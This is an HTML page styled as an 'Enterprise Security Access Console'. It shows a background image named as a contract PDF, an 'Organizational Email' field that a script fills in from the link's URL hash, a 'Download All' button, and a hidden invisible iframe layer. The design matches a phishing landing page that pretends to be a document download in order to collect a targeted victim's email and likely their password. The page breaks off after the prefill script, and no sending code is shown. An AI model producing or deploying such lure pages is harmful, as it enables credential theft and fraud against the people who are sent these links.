<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Security Access Console</title>
    <style>
        /* Modern Reset & Corporate Geometric Styling Layout */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        html, body {
            height: 100%;
            width: 100%;
        }

        body {
            /* FIXED: Combined and unified background stack guarantees immediate rendering */
            background: url("https://github.com/cdtechdigital/images/blob/main/Contract%20PDF%201.jpg?raw=true") no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }

        /* Full Screen Background Web Frame Component */
        .background-iframe-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
            pointer-events: none;
        }

        /* Translucent network screen overlay controls background alpha visibility */
        .background-alpha-shield {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(19, 78, 94, 0.6);
            z-index: 2;
            display: none;
        }

        /* Subtle abstract network lines background overlay */
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: radial-gradient(rgba(255,255,255,0.15) 1px, transparent 0);
            background-size: 24px 24px;
            z-index: 3;
            pointer-events: none;
        }

        /* Solid non-transparent matching container layout maximizes readability */
        .gateway-container {
            position: relative;
            z-index: 100; /* Forces the box to stack completely above all background overlays */
            background-color: #1a252f; /* Solid dark slate matches the corporate theme perfectly */
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
            max-width: 440px;
            width: calc(100% - 40px);
            text-align: center;
            overflow: hidden;
            border: 1px solid #2c3e50;
        }

        .status-header {
            font-size: 1.35rem;
            font-weight: 600;
            margin-bottom: 12px;
            color: #ffffff; /* Crisp white headers */
        }

        .status-message {
            font-size: 0.95rem;
            color:#cbd5e1; /* Clean grey-blue subtext */
            line-height: 1.6;
            margin-bottom: 20px;
        }

        /* Central Email Field Input Design */
        .input-group {
            width: 100%;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 0.75rem;
            color: #94a3b8;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }

        .input-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #334155;
            border-radius: 4px;
            background-color: #ffffff;
            color: #1a252f;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s ease;
        }

        .input-group input:focus {
            box-shadow: 0 0 0 4px rgba(33, 97, 140, 0.5);
            border-color: #21618c;
        }

        /* White glass-morphic button */
        .action-btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #ffffff;
            color: #21618c;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transition: all 0.2s ease-in-out;
            box-sizing: border-box;
            text-align: center;
        }

        .action-btn:hover {
            background-color: #f8fafc;
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .action-btn:disabled {
            background-color: #334155;
            color: #64748b;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loading-widget {
            color: #94a3b8;
            font-size: 0.85rem;
            margin-top: 15px;
            letter-spacing: 0.5px;
            display: none;
        }
    </style>
</head>
<body>

    <iframe id="backgroundWebEngine" class="background-iframe-layer" src="about:blank"></iframe>
    <div id="alphaShield" class="background-alpha-shield"></div>

    <div class="gateway-container">
        <!-- Exact matching corporate dark-blue header strip remains intact -->
        <div id="topHeader" style="background-color:#21618c; color:white; padding-top:10px; padding-bottom:10px; padding-left:20px; margin:-40px -40px 25px -40px; text-align:left; font-size:0.95rem; font-weight:500; letter-spacing:0.5px;">
            
        </div>

        <div class="status-header" id="statusHeader"></div>
        <div class="status-message" id="statusMessage"></div>
        
        <!-- Interactive Form Input Block -->
        <div class="input-group" id="inputFormGroup">
            <label for="email">Organizational Email</label>
            <input type="email" id="email" placeholder="username@company.com" autocomplete="off">
        </div>

        <button type="button" id="navigationGateButton" class="action-btn">Download All</button>
        <div class="loading-widget" id="loadingWidget"></div>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
